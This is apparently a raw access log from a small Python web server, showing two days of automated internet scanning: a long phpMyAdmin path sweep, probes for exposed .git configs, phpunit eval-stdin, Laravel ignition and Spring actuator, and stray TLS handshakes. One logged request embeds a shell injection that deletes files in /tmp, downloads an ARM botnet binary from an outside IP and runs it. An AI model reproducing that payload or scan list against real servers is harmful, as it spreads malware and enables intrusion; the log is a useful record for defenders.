+212.237.4.64 - - [05/Feb/2025 18:21:41] "[33mGET /mysql/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:42] "[33mGET /phpMyAdmin-latest/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:42] "[33mGET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:43] "[33mGET /admin/web/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:43] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:44] "[33mGET /phpMyAdmin6/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:44] "[33mGET /phpMyAdmin-5.2.1-english/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:45] "[33mGET /1phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:45] "[33mGET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:46] "[33mGET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:46] "[33mGET /phpmyadmin2021/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:47] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:47] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:48] "[33mGET /db/db-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:48] "[33mGET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:49] "[33mGET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:49] "[33mGET /phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:50] "[33mGET /admin/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:50] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:51] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:51] "[33mGET /administrator/web/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:52] "[33mGET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:52] "[33mGET /database/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:52] "[33mGET /phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:53] "[33mGET /sql/sqlweb/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:53] "[33mGET /program/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:54] "[33mGET /pma/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:54] "[33mGET /phpmy-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:55] "[33mGET /sql/sql/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:55] "[33mGET /mysqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:56] "[33mGET /php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:56] "[33mGET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:57] "[33mGET /sql/phpmy-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:57] "[33mGET /administrator/db/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:58] "[33mGET /mysql/db/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:58] "[33mGET /phppma/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:59] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:21:59] "[33mGET /shopdb/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:00] "[33mGET /mysqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:00] "[33mGET /phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:01] "[33mGET /administrator/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:01] "[33mGET /sql/sql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:02] "[33mGET /myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:02] "[33mGET /sql/phpmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:03] "[33mGET /mysql/dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:03] "[33mGET /phpMyAdmin1/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:04] "[33mGET /phpmyadmin2018/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:04] "[33mGET /phpmyadmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:05] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:05] "[33mGET /administrator/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:05] "[33mGET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:06] "[33mGET /phpMyAdmin-5.2.1/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:06] "[33mGET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:07] "[33mGET /sql/php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:07] "[33mGET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:08] "[33mGET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:08] "[33mGET /admin/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:09] "[33mGET /_phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:09] "[33mGET /phpmyadmin2020/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:10] "[33mGET /PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:10] "[33mGET /phpmyadmin2022/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:11] "[33mGET /sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:11] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:12] "[33mGET /db/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:12] "[33mGET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:13] "[33mGET /phpMyAdmin4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:13] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:14] "[33mGET /sql/webdb/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:14] "[33mGET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:15] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:15] "[33mGET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:16] "[33mGET /admin/sysadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:16] "[33mGET /_phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:17] "[33mGET /admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:17] "[33mGET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:18] "[33mGET /db/dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:18] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:19] "[33mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:19] "[33mGET /phpMyAdmin6.0/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:19] "[33mGET /admin/db/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:20] "[33mGET /phpmyadmin1/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:20] "[33mGET /db/webdb/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:21] "[33mGET /db/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:21] "[33mGET /mysql/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:22] "[33mGET /phpMyAdmin-4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:22] "[33mGET /phpmyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:23] "[33mGET /phpmyadmin2017/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:23] "[33mGET /mysql/sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:24] "[33mGET /sql/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:24] "[33mGET /phpmyadmin2019/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:25] "[33mGET /phpmyadmin6/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:25] "[33mGET /php-my-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:26] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:26] "[33mGET /db/phpmyadmin4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:27] "[33mGET /phpMyAdmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:27] "[33mGET /MyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:28] "[33mGET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:28] "[33mGET /phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:29] "[33mGET /mysql/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:29] "[33mGET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:30] "[33mGET /db/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:30] "[33mGET /phpMyAdmin-5.2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:31] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:31] "[33mGET /phpmy/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:32] "[33mGET /__phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:32] "[33mGET /db/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:33] "[33mGET /mysql/web/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:33] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:34] "[33mGET /phpmyadmin4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:34] "[33mGET /sql/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:35] "[33mGET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:35] "[33mGET /admin/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:35] "[33mGET /_phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:36] "[33mGET /sql/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:36] "[33mGET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:37] "[33mGET /index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:37] "[33mGET /2phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:38] "[33mGET /db/phpmyadmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:38] "[33mGET /phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:39] "[33mGET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:39] "[33mGET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:40] "[33mGET /db/dbweb/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:40] "[33mGET /phpMyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:41] "[33mGET /phpMyAdmin-5/index.php?lang=en HTTP/1.1[0m" 404 -
+212.237.4.64 - - [05/Feb/2025 18:22:41] "[33mGET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+205.210.31.156 - - [05/Feb/2025 18:30:58] "GET / HTTP/1.1" 200 -
+154.212.141.196 - - [05/Feb/2025 18:36:23] "GET / HTTP/1.1" 200 -
+80.82.77.202 - - [05/Feb/2025 18:44:37] "GET / HTTP/1.0" 200 -
+45.156.130.6 - - [05/Feb/2025 19:20:00] "GET / HTTP/1.1" 200 -
+45.156.130.45 - - [05/Feb/2025 19:20:09] "[33mGET /license.txt HTTP/1.1[0m" 404 -
+45.156.130.45 - - [05/Feb/2025 19:20:17] "[33mGET /wp-json HTTP/1.1[0m" 404 -
+199.45.154.144 - - [05/Feb/2025 19:20:49] code 400, message Bad request version ('À\x14À')
+199.45.154.144 - - [05/Feb/2025 19:20:49] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03[Éf­\x8esAó\x14aÕ\x8fh\x0dhã=\x83àô\x8cÚý¡:\x0e.»\x03t\x15Ï \x97D\x92\x8a\x88+T"Ò»6û\x89NÉ}Á×ÌB$\x96Ù£;\\Q¡È\x9en3\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+199.45.154.144 - - [05/Feb/2025 19:20:52] "GET / HTTP/1.1" 200 -
+199.45.154.144 - - [05/Feb/2025 19:20:56] "GET / HTTP/1.1" 200 -
+199.45.154.144 - - [05/Feb/2025 19:20:56] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.154.144 - - [05/Feb/2025 19:20:57] code 505, message Invalid HTTP version (2.0)
+199.45.154.144 - - [05/Feb/2025 19:20:57] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+92.255.57.58 - - [05/Feb/2025 19:30:34] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 19:33:07] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 19:42:22] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 19:45:43] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 19:52:43] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 19:57:14] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+18.234.216.213 - - [05/Feb/2025 19:57:21] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+46.19.138.234 - - [05/Feb/2025 20:03:45] "GET / HTTP/1.1" 200 -
+101.32.218.31 - - [05/Feb/2025 20:09:04] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 20:16:04] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+141.255.166.90 - - [05/Feb/2025 20:18:23] "GET / HTTP/1.1" 200 -
+179.43.191.146 - - [05/Feb/2025 20:32:56] "GET / HTTP/1.1" 200 -
+82.160.24.67 - - [05/Feb/2025 20:42:04] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 20:50:44] "[33mGET /console/ HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 20:55:31] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
+92.255.57.58 - - [05/Feb/2025 21:07:41] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 21:12:07] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 21:22:53] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+34.78.26.243 - - [05/Feb/2025 21:46:39] "GET / HTTP/1.1" 200 -
+164.52.24.188 - - [05/Feb/2025 21:49:20] code 400, message Bad request version ("}?/\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+164.52.24.188 - - [05/Feb/2025 21:49:20] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Â\x7f\x03íùúïR\x1d~\x8c½)è\x8c\x08ïÔX\x0c]\x11I¿\x8b\x84RE-¨ú9 èÉ[\x13ãßíI\x85p\x8cöo\x1fØv'\x13ö\x11\x19ä\x12\x08\x7f\x96ë\x01\x1e}?/\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+164.52.24.188 - - [05/Feb/2025 21:49:40] "GET / HTTP/1.1" 200 -
+101.32.218.31 - - [05/Feb/2025 21:51:29] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+47.100.121.12 - - [05/Feb/2025 21:54:37] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5 HTTP/1.1')
+47.100.121.12 - - [05/Feb/2025 21:54:37] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5 HTTP/1.1[0m" 400 -
+92.255.57.58 - - [05/Feb/2025 21:54:55] "[33mGET /geoserver HTTP/1.1[0m" 404 -
+185.242.226.80 - - [05/Feb/2025 22:06:45] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [05/Feb/2025 22:15:30] code 400, message Bad request version ('À\x13À')
+92.255.57.58 - - [05/Feb/2025 22:15:30] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03:L£É¬IÆ£SvZÜ`ú\x91ã1\x1bpi\x1ddLã\x8cjU\x97\x99e\x7f\x0e §½]LfÛ\x861\x07\x95ë¡ÉU\x8d1\x02Ì.\x01lÈC\x8fð-\x82Á?/\x10ô\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+167.94.145.98 - - [05/Feb/2025 22:18:56] "GET / HTTP/1.1" 200 -
+167.94.145.98 - - [05/Feb/2025 22:19:00] "GET / HTTP/1.1" 200 -
+167.94.145.98 - - [05/Feb/2025 22:19:00] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.145.98 - - [05/Feb/2025 22:19:01] code 505, message Invalid HTTP version (2.0)
+167.94.145.98 - - [05/Feb/2025 22:19:01] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+54.244.71.16 - - [05/Feb/2025 22:27:12] "GET / HTTP/1.1" 200 -
+54.244.71.16 - - [05/Feb/2025 22:27:33] "[33mGET /kit.fontawesome.com/0c69fdf2c0.js HTTP/1.1[0m" 404 -
+54.244.71.16 - - [05/Feb/2025 22:27:33] "[33mGET /cdn.js HTTP/1.1[0m" 404 -
+54.244.71.16 - - [05/Feb/2025 22:27:33] "[33mGET /dist/js/bootstrap.bundle.min.js HTTP/1.1[0m" 404 -
+141.255.166.90 - - [05/Feb/2025 22:28:13] "GET / HTTP/1.1" 200 -
+178.128.171.197 - - [05/Feb/2025 22:31:06] code 400, message Bad request version ('À\x14À')
+178.128.171.197 - - [05/Feb/2025 22:31:06] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÿ"m\x9fÝ\x1a¬\x1c:Uò\x90`\x02kU\x08µ1ùd±\x1e\x03\x19û$wb;\x0c\x01\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+178.128.171.197 - - [05/Feb/2025 22:31:07] code 400, message Bad request version ('À\x14À')
+178.128.171.197 - - [05/Feb/2025 22:31:07] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¡\x9baÿ°\x0bÑ9ièS¿ÑíZ\x7fä*\x9aÊ\x96ä,ÉsxïoZ\x8d\x1au\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+178.128.171.197 - - [05/Feb/2025 22:31:07] "GET / HTTP/1.1" 200 -
+178.128.171.197 - - [05/Feb/2025 22:31:08] "[33mGET /form.html HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:08] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:09] "[33mGET /t4 HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:09] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:10] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:11] "[33mGET /1.php HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:11] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+178.128.171.197 - - [05/Feb/2025 22:31:12] "[33mGET /password.php HTTP/1.1[0m" 404 -
+185.180.140.4 - - [05/Feb/2025 23:18:30] "GET / HTTP/1.1" 200 -
+101.32.218.31 - - [05/Feb/2025 23:33:14] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+103.138.4.77 - - [06/Feb/2025 00:00:28] "GET / HTTP/1.1" 200 -
+141.255.166.90 - - [06/Feb/2025 00:17:55] "GET / HTTP/1.1" 200 -
+80.66.83.49 - - [06/Feb/2025 00:24:21] code 400, message Bad request syntax ('\x04\x01\x00\x194e)9\x00')
+80.66.83.49 - - [06/Feb/2025 00:24:21] "[31m[1m\x04\x01\x00\x194e)9\x00[0m" 400 -
+80.66.83.49 - - [06/Feb/2025 00:25:22] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.49 - - [06/Feb/2025 00:25:22] "[31m[1m\x05\x01\x00[0m" 400 -
+80.66.83.49 - - [06/Feb/2025 00:25:22] "[33mCONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1[0m" 404 -
+104.224.65.156 - - [06/Feb/2025 00:27:43] "GET / HTTP/1.1" 200 -
+172.245.40.162 - - [06/Feb/2025 01:48:50] "GET / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:24] "GET / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:27] "HEAD / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:27] "GET / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:28] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+139.99.237.35 - - [06/Feb/2025 02:17:28] "HEAD /static/styles.css HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:28] "GET /static/styles.css HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:29] "[33mHEAD /${job.notice_url} HTTP/1.1[0m" 404 -
+139.99.237.35 - - [06/Feb/2025 02:17:35] "GET / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:44] "GET / HTTP/1.1" 200 -
+139.99.237.35 - - [06/Feb/2025 02:17:44] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+139.99.237.35 - - [06/Feb/2025 02:17:46] "[33mGET /${job.notice_url} HTTP/1.1[0m" 404 -
+139.99.237.35 - - [06/Feb/2025 02:17:55] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+141.255.166.90 - - [06/Feb/2025 02:17:55] "GET / HTTP/1.1" 200 -
+35.94.24.156 - - [06/Feb/2025 02:21:23] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+213.136.86.62 - - [06/Feb/2025 02:22:46] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+167.94.138.112 - - [06/Feb/2025 02:42:19] code 400, message Bad request version ('À\x14À')
+167.94.138.112 - - [06/Feb/2025 02:42:19] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\\ÄJí\x97þºß}]À^ÝÝQv\x11\x8fá\x83§;\x05tp<*M\x0c%ê\x9e jàÊ\x1d\x8b\x14"üdû"iÇù·\x921®v´nÅ\x12æ/÷¦\x04\x1d¨®+\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+167.94.138.112 - - [06/Feb/2025 02:43:04] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+167.94.138.112 - - [06/Feb/2025 02:43:04] "[31m[1mZG\x00\x00\x00\x05\x00+\x0e\x01\x00[0m" 400 -
+179.43.191.146 - - [06/Feb/2025 02:56:40] "GET / HTTP/1.1" 200 -
+206.168.34.201 - - [06/Feb/2025 02:57:28] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x16')
